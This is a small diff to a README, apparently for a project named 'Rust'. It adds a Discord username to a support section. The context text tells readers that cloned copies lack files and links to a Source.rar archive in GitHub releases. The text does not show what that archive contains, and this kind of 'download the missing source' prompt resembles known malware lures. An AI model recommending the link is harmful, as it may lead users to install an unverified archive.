@@ -11,3 +11,4 @@
 ### If Open Source cloned, some files are missing. for you to load here [Click Here](https://github.com/Speedyreal/Rust/releases/download/Rust/Source.rar)
 
 ### FOR SUPPORT : [Discord.gg/Sarnax](https://discord.com/invite/sarnax) 
+> #### Discord : Sarnax#9999
